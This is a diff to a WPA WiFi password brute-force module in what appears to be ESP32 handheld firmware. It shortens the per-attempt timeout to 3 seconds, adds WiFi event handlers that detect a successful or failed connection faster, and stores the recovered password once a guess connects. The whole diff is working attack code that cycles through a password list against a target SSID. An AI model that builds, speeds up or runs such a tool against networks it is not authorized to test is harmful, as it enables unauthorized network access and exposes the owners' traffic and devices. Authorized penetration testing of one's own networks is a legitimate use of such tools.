@@ -1,6 +1,6 @@
 // pid PID::WIFI_WPA_BF
 
-#define BF_ATTEMPT_TIMEOUT_MS 8000
+#define BF_ATTEMPT_TIMEOUT_MS 3000
 
 static bool   _bfFpDone      = false;
 static bool   _bfRunning     = false;
@@ -10,6 +10,8 @@ static int    _bfTotal       = 0;
 static String _bfCurrentPass = "";
 static unsigned long _bfAttemptStart = 0;
 static String* _bfPasswords  = nullptr;
+static volatile bool _bfGotResult   = false;
+static volatile bool _bfConnected   = false;
 
 static void _bfFreeList() {
 	delete[] _bfPasswords;
@@ -34,12 +36,25 @@ static void _bfDrawProgress() {
 	canvas.pushSprite(0, getStatusBarHeight());
 }
 
+static void _bfOnWifiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
+	if (event == ARDUINO_EVENT_WIFI_STA_CONNECTED) {
+		_bfConnected  = true;
+		_bfGotResult  = true;
+	} else if (event == ARDUINO_EVENT_WIFI_STA_DISCONNECTED) {
+		// Only treat as a result if we're mid-attempt and haven't connected
+		if (!_bfConnected) {
+			_bfGotResult = true;
+		}
+	}
+}
+
 static void _bfStartAttempt() {
+	_bfGotResult  = false;
+	_bfConnected  = false;
 	_bfCurrentPass = _bfPasswords[_bfIndex];
 	WiFi.disconnect(true);
 	delay(50);
 	WiFi.mode(WIFI_STA);
-	delay(50);
 	WiFi.begin(ssid.c_str(), _bfCurrentPass.c_str());
 	_bfAttemptStart = millis();
 	_bfDrawProgress();
@@ -50,6 +65,9 @@ void wifiBruteforceLoop() {
 		_bfFpDone  = false;
 		_bfRunning = false;
 		_bfDone    = false;
+		_bfGotResult  = false;
+		_bfConnected  = false;
+		WiFi.onEvent(_bfOnWifiEvent);
 		_bfRestart();
 	}
 
@@ -93,17 +111,22 @@ void wifiBruteforceLoop() {
 	// Done: wait for exit
 	if (_bfDone) { checkExit(); return; }
 
-	// Running: spinner on every tick
-	_bfDrawProgress();
-
+	// Running: redraw only when needed
 	bool timedOut = (millis() - _bfAttemptStart > BF_ATTEMPT_TIMEOUT_MS);
 
-	if (WiFi.isConnected()) {
+	if (!_bfGotResult && !timedOut) {
+		_bfDrawProgress();
+		checkExit();
+		return;
+	}
+
+	// Got result (event or timeout)
+	if (_bfConnected) {
 		_bfRunning = false;
 		_bfDone    = true;
 		WiFi.disconnect(true);
 		wifiPassword = _bfCurrentPass;
-		setDataString(wifiPasswordKey().c_str(), wifiPassword.c_str());
+		saveWifiPassword(ssid, wifiPassword);
 		String lines[] = { String(L->TXT_SUCCESS), _bfCurrentPass.substring(0, 20) };
 		centeredPrintRows(lines, 2, MEDIUM_TEXT);
 		soundSuccess();
@@ -111,25 +134,22 @@ void wifiBruteforceLoop() {
 		return;
 	}
 
-	wl_status_t status = WiFi.status();
-	if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL || timedOut) {
-		WiFi.disconnect(true);
-		_bfIndex++;
+	// Wrong password or timeout — next attempt
+	WiFi.disconnect(true);
+	_bfIndex++;
 
-		if (_bfIndex >= _bfTotal) {
-			_bfRunning = false;
-			_bfDone    = true;
-			char buf[20];
-			snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_DONE, _bfTotal);
-			String lines[] = { String(L->TXT_FAILED), String(buf) };
-			centeredPrintRows(lines, 2, MEDIUM_TEXT);
-			soundError();
-			_bfFreeList();
-			return;
-		}
-
-		_bfStartAttempt();
+	if (_bfIndex >= _bfTotal) {
+		_bfRunning = false;
+		_bfDone    = true;
+		char buf[20];
+		snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_DONE, _bfTotal);
+		String lines[] = { String(L->TXT_FAILED), String(buf) };
+		centeredPrintRows(lines, 2, MEDIUM_TEXT);
+		soundError();
+		_bfFreeList();
+		return;
 	}
 
+	_bfStartAttempt();
 	checkExit();
 }
